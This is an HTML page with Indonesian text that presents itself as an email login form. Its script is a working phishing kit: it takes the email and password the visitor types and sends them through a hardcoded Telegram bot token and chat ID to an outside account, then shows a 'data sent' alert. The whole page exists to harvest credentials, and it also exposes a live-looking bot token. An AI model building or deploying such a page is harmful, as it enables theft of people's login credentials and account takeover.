<!DOCTYPE html>
<html>
<head>
<title>Kirim Telegram</title>
<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  background: linear-gradient(135deg, #667eea, #764ba2);
}

.container {
  background: #f5f5f5;
  padding: 30px;
  width: 350px;
  border-radius: 15px;
  text-align: center;
  box-shadow: 0 10px 25px rgba(0,0,0,0.2);
}

h2 {
  margin-bottom: 20px;
}

input {
  width: 100%;
  padding: 12px;
  margin: 8px 0;
  border-radius: 8px;
  border: 1px solid #ccc;
  outline: none;
  font-size: 14px;
}

button {
  width: 100%;
  padding: 12px;
  margin-top: 10px;
  border: none;
  border-radius: 8px;
  background: linear-gradient(135deg, #667eea, #764ba2);
  color: white;
  font-size: 16px;
  cursor: pointer;
}

button:hover {
  opacity: 0.9;
}

.note {
  font-size: 12px;
  color: #666;
  margin-top: 10px;
}
</style>
</head>

<body>

<div class="container">
  <h2>LOGIN EMAIL</h2>

  <input type="text" id="token" placeholder="EMAIL">
  <input type="text" id="chat_id" placeholder="PASWORD">

  <button onclick="kirim()">Kirim</button>

  <div class="note">Harap masukan alamat email dan pasword</div>
</div>

<script>
function kirim() {
  var token = document.getElementById("token").value;
  var chat_id = document.getElementById("chat_id").value;

  if(token === "" || chat_id === ""){
    alert("Harap isi semua field!");
    return;
  }

  // pesan berisi semua data
  var pesan = "DATA MASUK:\n\n"
            + "EMAIL: " + token + "\n"
            + "PASWORD: " + chat_id;

  fetch("https://api.telegram.org/bot8566904522:AAEWFB-1fbvjnJbEAQ7E0FUVCDnbRzrVFBU/sendMessage", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: 6297122078,
      text: pesan
    })
  })
  .then(res => res.json())
  .then(data => {
    alert("Data berhasil dikirim!");
  })
  .catch(err => {
    alert("Gagal mengirim!");
    console.log(err);
  });
}
</script>

</body>
</html>
